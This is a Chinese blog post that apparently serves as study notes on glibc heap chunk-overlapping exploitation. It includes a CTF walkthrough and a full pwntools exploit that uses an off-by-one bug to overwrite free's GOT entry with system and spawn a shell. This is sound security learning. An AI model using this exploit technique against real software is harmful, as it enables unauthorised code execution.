@@ -1,0 +1,578 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="清風微醺" href="https://www.wdqjxtmph.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="清風微醺" href="https://www.wdqjxtmph.top/atom.xml" />
+<link rel="alternate" type="application/json" title="清風微醺" href="https://www.wdqjxtmph.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="堆" />
+
+
+<link rel="canonical" href="https://www.wdqjxtmph.top/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/">
+
+
+
+  <title>
+堆学习-Chunk Overlapping - 学习笔记 |
+Nirvana = 清風微醺 = 凌恒</title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">堆学习-Chunk Overlapping
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2021-10-24 02:00:08">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2021-10-24T02:00:08+08:00">2021-10-24</time>
+  </span>
+  <span class="item" title="本文字数">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">本文字数</span>
+    <span>5.7k</span>
+    <span class="text">字</span>
+  </span>
+  <span class="item" title="阅读时长">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">阅读时长</span>
+    <span>5 分钟</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">Nirvana</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclh3brzpj20zk0m8ann.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giph47e9vtj20zk0m8x6l.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicljgocqbj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciukx8a7j20zk0m8aio.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipey0a334j20zk0m8qpt.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="item" rel="index" title="分类于 学习笔记"><span itemprop="name">学习笔记</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://www.wdqjxtmph.top/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="invincible">
+    <meta itemprop="description" content="凌恒, 凌恒山其若陋兮、">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="清風微醺">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <p>CTF-wiki 真是太好一学习网站了。</p>
+<p>原文链接：<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9jaHVuay1leHRlbmQtb3ZlcmxhcHBpbmcvI18x">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/chunk-extend-overlapping/#_1</span></p>
+<h1 id="chunk-extend"><a class="markdownIt-Anchor" href="#chunk-extend">#</a> Chunk Extend</h1>
+<h2 id="实现条件"><a class="markdownIt-Anchor" href="#实现条件">#</a> 实现条件</h2>
+<p><strong>要实现 chunk extend 需要满足的条件</strong>：有堆漏洞，并且该漏洞可以修改 chunk header 里的数据。</p>
+<h2 id="实现原理"><a class="markdownIt-Anchor" href="#实现原理">#</a> 实现原理</h2>
+<p>原理大概就是：</p>
+<p>①：ptmalloc 通过 chunk header 里面的 prev_size 和 size 来对前后堆块进行定位。</p>
+<p>②：ptmalloc 通过查看下一个堆的 prev_inuse 值来判断该 chunk 是否被使用。（不能通过 prev_size 来判断，因为虽然 **” 该 chunk 为空时，下一个堆块的 pre_size 会记录该 chunk 的大小。“** 但是不能判断 pre_size 里记录的数据到底是上一个 chunk 的 size 还是上一个 chunk 的末尾数据）</p>
+<p>因此我们如果能控制 chunk header 里面的数据，就可以导致 chunk overlapping，可以控制 chunk 里面的内容，如果可以控制的 chunk 内容范围里存在指针等，就可以修改指针值达到任意地址读写或者控制程序流程。</p>
+<h2 id="实现步骤"><a class="markdownIt-Anchor" href="#实现步骤">#</a> 实现步骤</h2>
+<p>个人笔记：①：fastbin 由于追求效率，安全检验机制机制较弱，free 时找到 fastbin 链表中符合大小的堆块就直接加入了，不会检测 pre_insue 的值。同时，物理地址相邻的 fastbin 不会合并。</p>
+<p>​			   	②：fastbin 的最大使用范围为 0x70，若不属于 fastbin，在合并时会与 topchunk 合并。因此 free 的堆块必须和 top chunk 中间需要有一个小堆块将这两者隔开。</p>
+<p>​				   ③：通过 extend 前向 overlapping，利用的是 unlink 机制，修改 free 掉的堆块的 prev_insue 值和 prev_size 值即可。</p>
+<p>具体见上文中链接。</p>
+<h1 id="例题一"><a class="markdownIt-Anchor" href="#例题一">#</a> 例题一</h1>
+<p>链接：<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWdKQ0NQODF4ZWdBRlpHUHM3aEpWUnc=">https://pan.baidu.com/s/1gJCCP81xegAFZGPs7hJVRw</span><br>
+ 提取码：F1re</p>
+<p>很友好的一道题，题目是常见的菜单。</p>
+<p>gdb 调试后还原堆结构体：</p>
+<img data-src="\images\chunk-overlapping\1.png" style="zoom:67%;"/>
+<ul>
+<li>
+<p>功能一：create_heap: 在选择创造堆块的功能时，系统会先自动分配了 0x20 的内存，拿来存放结构体。然后可以分配用户输入的大小的堆。</p>
+</li>
+<li>
+<p>功能二：edit_heap：能修改堆块的 content 值，查看 read_input 函数后发现存在 off-by-one 漏洞，可以通过该漏洞在一定条件下覆盖下一个堆块的 size 值。</p>
+</li>
+<li>
+<p>功能三：show_heap：将 content size 的值和 content 打印出来。</p>
+</li>
+<li>
+<p>功能四：delete_heap：先 free 掉我们的 content 部分，然后 free 掉系统帮我们自动申请的 struct 部分，最后将堆指针置为零。</p>
+</li>
+</ul>
+<h2 id="基本思路"><a class="markdownIt-Anchor" href="#基本思路">#</a> 基本思路</h2>
+<p>该题满足了实现 chunk-extend 的两个条件。因此我的基本思路是：</p>
+<p>①：创建两个堆，利用 edit_heap 函数的 off-by-one 漏洞修改第一个堆的 content 值，然后覆盖修改第二个堆的 chunk header 里面的 size 值。</p>
+<p>②：通过 delete_heap 函数 free 掉第二个堆，再通过 create_heap 函数重新申请回来，造成 chunk-overlapping，即可使 chunk header 里的指针域处于可修改的 content 域中，可控制指针，达到任意地址跳转和读写。</p>
+<p>③：改写 free_got 成 system 函数地址，并在 free 的参数里放置 “/bin/sh&quot;, 最后利用 delete_heap 函数调用 free 函数实现 get shell。</p>
+<h3 id="实现步骤1"><a class="markdownIt-Anchor" href="#实现步骤1">#</a> 实现步骤①：</h3>
+<p>这是正常创建两个堆后的内存图，content size 均为 0x10.</p>
+<img data-src="\images\chunk-overlapping\2.png" style="zoom:67%;"/>
+<p>由于我们能输入到 content 里面的数据是 content size+1 个，因此我们最多只能覆盖到 0x6032d0 的第一个字节，也就是覆盖到第二个堆块的 prev_size 字节。但我们知道，前一个堆不为空的时候，该堆的 prev_size 是不起作用的，置为 0，而此时该堆的 prev_size 是可以拿来储存物理相邻的前一个堆的数据的 (<strong>该机制被称为 chunk 的空间复用</strong>)。且根据堆分配机制，用户请求的字节是拿来储存数据的，若我们一开始给 heap1 请求 0x18 的内存，由于 chunk 空间复用的关系，系统只会多分配 0x10 的内存给 heap1，而由于 edit_heap 函数里的：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_input(*((<span class="keyword">void</span> **)*(&amp;heaparray + v1) + <span class="number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br></pre></td></tr></table></figure>
+<p>因此我们可以读入 0x19 个字符，此时就可以覆盖到 heap2 的 size 字段。</p>
+<p>实操：</p>
+<p>先定义基本操作函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Content of heap : &quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br></pre></td></tr></table></figure>
+<p>分配 heap1 和和 heap2，以及通过 edit 函数覆盖 heap2 struct 结构体里的 size 字段。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">pad = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,pad)</span><br></pre></td></tr></table></figure>
+<p>这里 pad 里面为什么要加入’/bin/sh\0’先埋一个伏笔。</p>
+<p>此时查看一下堆：</p>
+<img data-src="\images\chunk-overlapping\3.png" style="zoom:67%;"/>
+<p>可以看到 heap2 的 size 字段确实被覆盖掉了。</p>
+<h3 id="实现步骤2"><a class="markdownIt-Anchor" href="#实现步骤2">#</a> 实现步骤②：</h3>
+<p>经过步骤一，heap2 的 struct 部分已经被系统看做是一块 0x40 大小的堆块（称作 s1，以便后面好讲述），content 部分是一块 0x20 大小的堆块（称作 s2）。这两个堆块的大小都属于 fastbin 的范围，由于<strong> fastbin 由于追求效率，安全检验机制机制较弱，free 时找到 fastbin 链表中符合大小的堆块就直接加入了，不会检测 pre_insue 的值。同时，物理地址相邻的 fastbin 不会合并</strong>，因此我们直接 free 掉 heap2 就会将 s1 与 s2 置入 fastbin 链表中（这道题我的环境置入了 tcachebins 链表，应该是由于我的本地 libc 高于它的版本导致的，不过 tcachebins 与 fastbin 性质相似。）</p>
+<p>如图，已含有 0x20 与 0x40 大小的空闲堆。</p>
+<img data-src="\images\chunk-overlapping\4.png" style="zoom:67%;"/>
+<p>同时，原堆处变成了这样：</p>
+<img data-src="\images\chunk-overlapping\5.png" style="zoom:67%;"/>
+<p>此时我们 create 新的 heap2 时，系统会先自动分配一个 0x20 大小的结构体，这时 tcachebins 链表里 0x20 空闲的堆块就被拿回来继续用了，也就是上图中的 2，若我们申请 0x30 大小，系统会返回 0x40 大小的堆块，而 tcachebins 链表中也有 0x40 空闲的堆块，也就是上图中的 1。（注意，申请相同大小才能从 fastbin 或者 tcachebins 中直接取堆块，因此申请 0x30 是有讲究的）。这样我们就实现了原来的 struct 部分拿来充当 content，而原来的 content 部分拿来充当 struct。而我们能够输入 0x31 大小的数据，足够覆盖到新 struct 部分的指针处了。而 edit_heap 函数可以改变指针所指地方的内容，show_heap 又可输出指针所指地方的内容。因此我们就实现了任意地址读写的功能。</p>
+<p>同时由于 edit_heap 函数里读入字符串长度依旧由 struct 部分里的 content size 决定：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_input(*((<span class="keyword">void</span> **)*(&amp;heaparray + v1) + <span class="number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="number">1LL</span>);</span><br></pre></td></tr></table></figure>
+<p>（<strong>所以新 struct 里的 content size 还是得写入 0x30，</strong>。）</p>
+<p>同时这道题没有开启 FULL RELRO, 因此可以改写函数 GOT 表。最终我们改写 free 函数 GOT 表后，调用 delete_heap 函数，第一个 free 里的参数是：content 里面的值，故我们之前在 heap1 的 content 里布置了’/bin/sh\0’, 其中‘\0’拿来截断，伏笔消除。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*((<span class="keyword">void</span> **)*(&amp;heaparray + v1) + <span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp：</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;/mnt/hgfs/ubuntu/heapcreator&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/heapcreator&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/mnt/hgfs/ubuntu/libc.so.6&#x27;</span>)</span><br><span class="line">r = process([<span class="string">&#x27;/mnt/hgfs/ubuntu/heapcreator&#x27;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Content of heap:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Content of heap : &quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;Index :&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    free_got=elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(free_got))</span><br><span class="line">    create(<span class="number">0x18</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">    create(<span class="number">0x10</span>,<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">    pad = <span class="string">b&#x27;/bin/sh\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x41&#x27;</span></span><br><span class="line">    edit(<span class="number">0</span>,pad)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    pause()</span><br><span class="line">    write_free_got = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x30</span>)+p64(free_got)</span><br><span class="line">    create(<span class="number">0x30</span>,write_free_got)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Content : &quot;</span>)</span><br><span class="line">    free_addr = u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">    libc_base = free_addr-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit_free_got = p64(system_addr)</span><br><span class="line">    edit(<span class="number">1</span>,edit_free_got)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line">    <span class="comment"># gdb.attach(r)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
+
+      <div class="tags">
+          <a href="/tags/%E5%A0%86/" rel="tag"><i class="ic i-tag"></i> 堆</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2021-10-28 15:11:19" itemprop="dateModified" datetime="2021-10-28T15:11:19+08:00">2021-10-28</time>
+  </span>
+  <span id="2021/10/24/堆学习笔记-chunk overlapping/" class="item leancloud_visitors" data-flag-title="堆学习-Chunk Overlapping" title="阅读次数">
+      <span class="icon">
+        <i class="ic i-eye"></i>
+      </span>
+      <span class="text">阅读次数</span>
+      <span class="leancloud-visitors-count"></span>
+      <span class="text">次</span>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="invincible 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="invincible 支付宝">
+        <p>支付宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>invincible <i class="ic i-at"><em>@</em></i>清風微醺
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://www.wdqjxtmph.top/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/" title="堆学习-Chunk Overlapping">https://www.wdqjxtmph.top/2021/10/24/堆学习笔记-chunk overlapping/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2021/10/21/%E4%B8%80%E9%81%93%E9%99%90%E5%88%B6%E5%BE%88%E5%A4%9A%E7%9A%84fmt%E9%A2%98/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclx29mstj20zk0m8hdt.jpg" title="格式化字符串漏洞进阶">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> CTF</span>
+  <h3>格式化字符串漏洞进阶</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#chunk-extend"><span class="toc-number">1.</span> <span class="toc-text"> Chunk Extend</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.1.</span> <span class="toc-text"> 实现条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 实现原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.3.</span> <span class="toc-text"> 实现步骤</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98%E4%B8%80"><span class="toc-number">2.</span> <span class="toc-text"> 例题一</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.</span> <span class="toc-text"> 基本思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A41"><span class="toc-number">2.1.1.</span> <span class="toc-text"> 实现步骤①：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A42"><span class="toc-number">2.1.2.</span> <span class="toc-text"> 实现步骤②：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.2.</span> <span class="toc-text"> exp：</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li class="active"><a href="/2021/10/24/%E5%A0%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-chunk%20overlapping/" rel="bookmark" title="堆学习-Chunk Overlapping">堆学习-Chunk Overlapping</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
